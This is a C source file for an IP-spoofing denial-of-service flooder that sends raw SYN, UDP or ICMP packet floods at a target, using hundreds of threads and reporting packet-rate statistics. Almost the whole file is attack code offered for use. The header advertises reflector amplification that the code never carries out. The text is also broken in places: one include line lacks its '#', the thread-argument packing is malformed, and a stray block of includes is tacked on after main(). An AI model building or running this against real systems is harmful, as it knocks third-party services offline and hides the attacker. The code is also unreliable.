/*
 * Advanced Multi-Vector Flooder: Version 3.0
 * - Modes: SYN, UDP, ICMP
 * - Auto-resolve hostnames/URLs to IPv4
 * - Dynamic thread management based on CPU cores or CLI override
 * - Adaptive attack: switch between SYN and UDP flood
 * - Randomized IP spoofing within CIDR ranges or from file
 * - Reflector amplification support (UDP-based reflectors)
 * - Real-time stats: pps (packets/sec) and bps (bytes/sec)
 * - CLI with ANSI colors and long options
 *
 * Usage:
 *   ./flooder -m <mode> -t <target> [-p port] [-d duration] [-T threads]
 *              [-r <cidr_or_file>] [-a <reflector_file>] [-i interval]
 *              [-l <log_file>]
 *
 * Modes:
 *   syn  - TCP SYN flood
 *   udp  - UDP brute flood
 *   icmp - ICMP ping flood
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <getopt.h>
#include <errno.h>
#include <netdb.h>
#include <sys/sysinfo.h>

#define MAX_SPOOF 64
#define MAX_REFLECT 256
#define PACKET_SYN   (sizeof(struct iphdr) + sizeof(struct tcphdr))
#define PACKET_UDP   (sizeof(struct iphdr) + sizeof(struct udphdr))
#define PACKET_ICMP  (sizeof(struct iphdr) + sizeof(struct icmphdr))

static atomic_ulong total_packets, total_bytes;
static volatile int running = 1;

struct cidr { uint32_t base, mask; } spoof_list[MAX_SPOOF];
int spoof_count = 0;

struct reflector { uint32_t ip; uint16_t port; } reflect_list[MAX_REFLECT];
int reflect_count = 0;

// ANSI colors
#define RED    "\x1b[31m"
#define GREEN  "\x1b[32m"
#define YELLOW "\x1b[33m"
#define RESET  "\x1b[0m"

void sigint_handler(int sig) { running = 0; }

unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for(; nwords>0; nwords--) sum += *buf++;
    sum = (sum>>16) + (sum & 0xffff);
    sum += (sum>>16);
    return (unsigned short)(~sum);
}

int add_spoof(const char *s) {
    if(spoof_count>=MAX_SPOOF) return -1;
    char ip[32]; int pre;
    if(sscanf(s, "%31[^/]/%d", ip, &pre)!=2) return -1;
    struct in_addr a;
    if(inet_pton(AF_INET, ip, &a)!=1) return -1;
    spoof_list[spoof_count].mask = pre>=0&&pre<=32 ? htonl(~((1u<<(32-pre))-1)) : 0;
    spoof_list[spoof_count].base = a.s_addr & spoof_list[spoof_count].mask;
    return spoof_count++;
}

void load_spoof_file(const char *file) {
    FILE *f = fopen(file, "r"); char line[64];
    while(f && fgets(line,sizeof(line),f)) {
        line[strcspn(line,"\r\n")] = 0;
        add_spoof(line);
    }
    if(f) fclose(f);
}

uint32_t random_spoof() {
    if(spoof_count==0) return rand();
    int i=rand()%spoof_count;
    uint32_t mask = ntohl(spoof_list[i].mask);
    uint32_t base = ntohl(spoof_list[i].base);
    uint32_t host = rand() & ~mask;
    return htonl(base | host);
}

void load_reflectors(const char *file) {
    FILE *f=fopen(file,"r"); char ipstr[32], portstr[8];
    while(f && fscanf(f,"%31[^:]:%7s",ipstr,portstr)==2 && reflect_count<MAX_REFLECT) {
        struct in_addr a; inet_pton(AF_INET,ipstr,&a);
        reflect_list[reflect_count].ip = a.s_addr;
        reflect_list[reflect_count].port = htons(atoi(portstr));
        reflect_count++;
    }
    if(f) fclose(f);
}

int resolve_host(const char *host, struct sockaddr_in *sin) {
    struct addrinfo hints={.ai_family=AF_INET,.ai_socktype=SOCK_RAW}, *res;
    if(getaddrinfo(host,NULL,&hints,&res)) return -1;
    *sin = *(struct sockaddr_in*)res->ai_addr;
    freeaddrinfo(res); return 0;
}

void build_syn(char *pkt, struct sockaddr_in *tgt, int port) {
    struct iphdr *ip = (void*)pkt;
    struct tcphdr *tcp = (void*)(pkt+sizeof(*ip));
    ip->ihl=5; ip->version=4; ip->tos=0;
    ip->tot_len=htons(PACKET_SYN); ip->id=rand(); ip->frag_off=0;
    ip->ttl=64; ip->protocol=IPPROTO_TCP;
    ip->saddr = random_spoof(); ip->daddr = tgt->sin_addr.s_addr;
    ip->check=0; ip->check=checksum((unsigned short*)ip,sizeof(*ip)/2);
    tcp->source = htons(rand()%65535);
    tcp->dest = htons(port); tcp->seq = rand(); tcp->ack_seq=0;
    tcp->doff=5; tcp->syn=1; tcp->window=htons(1024);
    tcp->check=0;
    struct {uint32_t s,d; uint8_t z,p; uint16_t l;} psh={
        .s=ip->saddr,.d=ip->daddr,.z=0,.p=IPPROTO_TCP,.l=htons(sizeof(*tcp))};
    int sz=sizeof(psh)+sizeof(*tcp);
    char *tmp=malloc(sz);
    memcpy(tmp,&psh,sizeof(psh)); memcpy(tmp+sizeof(psh),tcp,sizeof(*tcp));
    tcp->check=checksum((unsigned short*)tmp,sz/2);
    free(tmp);
}

void build_udp(char *pkt, struct sockaddr_in *tgt, int port) {
    struct iphdr *ip=(void*)pkt; struct udphdr *udp=(void*)(pkt+sizeof(*ip));
    ip->ihl=5; ip->version=4; ip->tos=0; ip->tot_len=htons(PACKET_UDP);
    ip->id=rand(); ip->frag_off=0; ip->ttl=64; ip->protocol=IPPROTO_UDP;
    ip->saddr=random_spoof(); ip->daddr=tgt->sin_addr.s_addr;
    ip->check=0; ip->check=checksum((unsigned short*)ip,sizeof(*ip)/2);
    udp->source=htons(rand()%65535); udp->dest=htons(port);
    udp->len=htons(sizeof(*udp)); udp->check=0; // optional
}

void build_icmp(char *pkt, struct sockaddr_in *tgt) {
    struct iphdr *ip=(void*)pkt; struct icmphdr *icmp=(void*)(pkt+sizeof(*ip));
    ip->ihl=5; ip->version=4; ip->tos=0; ip->tot_len=htons(PACKET_ICMP);
    ip->id=rand(); ip->frag_off=0; ip->ttl=64; ip->protocol=IPPROTO_ICMP;
    ip->saddr=random_spoof(); ip->daddr=tgt->sin_addr.s_addr;
    ip->check=0; ip->check=checksum((unsigned short*)ip,sizeof(*ip)/2);
    icmp->type=ICMP_ECHO; icmp->code=0; icmp->checksum=0;
    icmp->un.echo.id=rand(); icmp->un.echo.sequence=rand();
    icmp->checksum=checksum((unsigned short*)icmp,sizeof(*icmp)/2);
}

void *flood_thread(void *arg) {
    char *mode = ((char**)arg)[0];
    struct sockaddr_in tgt = *(struct sockaddr_in*)((char**)arg+1);
    int port = *((int*)((char**)arg+2));
    int sock = socket(AF_INET, SOCK_RAW, mode[0]=='s'?IPPROTO_TCP:
                             mode[0]=='u'?IPPROTO_UDP:IPPROTO_ICMP);
    int on=1; setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    char packet[PACKET_ICMP>PACKET_UDP?PACKET_ICMP:PACKET_UDP];
    while(running) {
        if(mode[0]=='s') build_syn(packet,&tgt,port);
        else if(mode[0]=='u') build_udp(packet,&tgt,port);
        else build_icmp(packet,&tgt);
        sendto(sock,packet, mode[0]=='s'?PACKET_SYN:(mode[0]=='u'?PACKET_UDP:PACKET_ICMP),
               0,(struct sockaddr*)&tgt,sizeof(tgt));
        atomic_fetch_add(&total_packets,1);
        atomic_fetch_add(&total_bytes, mode[0]=='u'?PACKET_UDP:(mode[0]=='s'?PACKET_SYN:PACKET_ICMP));
    }
    close(sock); return NULL;
}

int main(int argc, char **argv) {
    signal(SIGINT,sigint_handler);
    char *mode=NULL,*target=NULL,*spfile=NULL,*reffile=NULL,*logfile=NULL;
    int port=80,dur=30,interval=2,threads=0;
    struct option opts[] = {{"mode",1,0,'m'},{"target",1,0,'t'},{"port",1,0,'p'},
                            {"duration",1,0,'d'},{"threads",1,0,'T'},{"spoof",1,0,'r'},
                            {"reflect",1,0,'a'},{"interval",1,0,'i'},{"log",1,0,'l'},{0,0,0,0}};
    int opt;
    while((opt=getopt_long(argc,argv,"m:t:p:d:T:r:a:i:l:",opts,NULL))!=-1) {
        switch(opt) {
            case 'm': mode = optarg; break;
            case 't': target = optarg; break;
            case 'p': port = atoi(optarg); break;
            case 'd': dur = atoi(optarg); break;
            case 'T': threads = atoi(optarg); break;
            case 'r': (strchr(optarg,'/')?add_spoof(optarg):load_spoof_file(optarg)); break;
            case 'a': load_reflectors(optarg); break;
            case 'i': interval = atoi(optarg); break;
            case 'l': logfile = optarg; break;
        }
    }
    if(!mode||!target) { fprintf(stderr,RED"Missing mode or target"RESET"\n"); return 1; }
    struct sockaddr_in tgt={0};
    if(resolve_host(target,&tgt)<0) { fprintf(stderr,RED"Cannot resolve %s"RESET"\n",target); return 1; }
    tgt.sin_port = htons(port);
    int cores = get_nprocs();
    if(!threads) threads = cores * 100;
    pthread_t tid[threads];
    printf(YELLOW"Launching %d threads mode=%s target=%s:%d for %dsec..."RESET"\n",
           threads,mode,target,port,dur);
    char *ctx[3]; ctx[0]=mode; memcpy(ctx+1,&tgt,sizeof(tgt)); memcpy((char*)ctx+1+sizeof(tgt),&port,sizeof(port));
    for(int i=0;i<threads;i++) pthread_create(&tid[i],NULL,flood_thread,ctx);
    FILE *logf = logfile?fopen(logfile,"w"):NULL;
    for(int t=0;t<dur && running; t+=interval) {
        sleep(interval);
        unsigned long pps = atomic_exchange(&total_packets,0);
        unsigned long bps = atomic_exchange(&total_bytes,0);
        printf(GREEN"[%2ds] PPS:%10lu BPS:%10lu"RESET"\n",t+interval,pps,bps);
        if(logf) fprintf(logf,"%d,%lu,%lu\n",t+interval,pps,bps);
    }
    running=0;
    for(int i=0;i<threads;i++) pthread_join(tid[i],NULL);
    if(logf) fclose(logf);
    printf(YELLOW"Done. Total sent logged%s"RESET"\n", logfile?"":" (stdout only)");
    return 0;
}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>	/* superset of previous */
#include <netinet/ip_icmp.h>	/* ICMP header */
#include <netinet/tcp.h>	/* TCP header */
#include <netinet/udp.h>	/* UDP header */
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/resource.h> /* for getrlimit */
#include <errno.h>
#include <stdatomic.h>
	
